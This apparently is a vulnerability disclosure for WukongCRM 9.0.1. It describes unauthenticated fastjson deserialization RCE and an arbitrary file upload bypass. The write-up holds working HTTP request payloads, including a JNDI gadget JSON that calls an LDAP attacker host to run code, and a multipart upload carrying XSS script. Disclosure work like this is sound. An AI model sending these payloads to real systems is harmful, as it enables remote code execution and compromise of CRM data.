# Project
Address: [WukongCRM-9.0-JAVA](https://github.com/WuKongOpenSource/WukongCRM-9.0-JAVA)

Version: [72crm_9.0.1_20191202](https://github.com/WuKongOpenSource/WukongCRM-9.0-JAVA/releases/tag/v9.0.1_20191202)

# 1.Remote code execution vulnerability
  In version 72crm_9.0.1_20191202, insecure components are used, which causes potential remote command execution. Attackers can directly attack the system without authorization.
An insecure version of the fastjson component was used.
![1704868475775](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/17ca0cbc-e735-4baa-83df-3c9d419e8657)
  First we found a vulnerability trigger :
  
http://localhost:8080/CrmCustomer/queryPageList

  The construction method of BasePageRequest is called for processing. In the process of processing, the parseObject() method of fastjson is first called to parse the json string into a java bean. Due to the deserialization vulnerability of this version of fastjson, Attackers just visit: / CrmCustomer/queryPageList, and enter the malicious json string, can trigger a loophole.
![1704868558336](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/306cec15-e820-467b-a272-6616022c2988)
There are many attack modes in version 1.2.54, and only one of them is shown below:

This attack requires the xbean jar package to be introduced and AutoType to be enabled
![1704868582627](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/b9b3fe96-4be3-4897-865b-0bcd90274203)
![1704868589487](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/eb0e81bc-77eb-4666-ae20-006d6ebcf8d6)
Start the attack
![1704868744804](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/90613d47-78a2-40a4-8352-96ea218e6622)
Due to some problems in the authentication logic, the attacker does not even need Admin-Token, and directly launches attacks without authorization.
![1704868628296](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/26df5ce2-b472-48b6-be57-f3f788918521)
Payload :
```
POST /CrmCustomer/queryPageList HTTP/1.1
Host: localhost:8080
Content-Length: 115
Content-Type: application/json;charset=UTF-8
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Connection: close

{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://ip:port/Basic/Command/calc"}"
```

# 2. Arbitrary file upload vulnerability
Vulnerability location: http://localhost:8080/sysConfig/setSysConfig
  Call the setSysConfig()->upload() method to upload the file
![ee5c2034fb13a0b1e8538451c13b2a0](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/fbf5afbb-a897-4a53-9084-5a73acbe9d25)
![ef72d6ef56e5cf891bf458116698aa8](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/63af00c5-69ee-4929-bb17-ca4f2e3d559e)
  Here, script files such as jsp are simply blacklisted, so we can use some bypass techniques to achieve the effect of arbitrary file upload
Payload :
```
POST /sysConfig/setSysConfig HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHGXctR7zHEGx8K25
Admin-Token: 5de65397365d43cb8a95a1a5ef176371
Connection: close
Content-Length: 301

------WebKitFormBoundaryHGXctR7zHEGx8K25
Content-Disposition: form-data; name="name"

rwat
------WebKitFormBoundaryHGXctR7zHEGx8K25
Content-Disposition: form-data; name="file"; filename="hello.html"
Content-Type: image/png

<script>alert(1)</script>
------WebKitFormBoundaryHGXctR7zHEGx8K25--
```
```
GET /sysConfig/querySysConfig HTTP/1.1
Host: localhost:8080
Connection: close


```
  First we upload a jsp file:
![1704871906733](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/88a05a03-156e-4950-9fa4-8a73c7db7c77)

  Access /sysConfig/querySysConfig interface, can view the file is uploaded successfully, If the upload is successful, the file path is returned, if not, rwat.
![1704872106023](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/b99bb290-2a20-44da-884d-b2f7d0d9b418)

  The upload folder is empty:
  
![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/b1a18a3d-c85a-4e7c-8cd1-a6994eb8d19c)

  bypass attempt:
![1704872278979](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/13e73799-9943-4259-956a-60e73da27463)

  Return to upload path
![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c5278134-8852-4913-bc2c-ed342ac9af15)
![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/8d82c2c4-6880-4cb2-a8eb-01dc6b95cd01)

  Next, we try to upload an XSS malicious file
![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/7ded1971-b6d5-4d44-804c-4e66bf4f188c)
![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/1e18fa8f-dbdf-42dd-9a39-e3cac705f2ef)
![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/26e7dde3-ad1a-4b25-acdf-87c84cffea9d)








































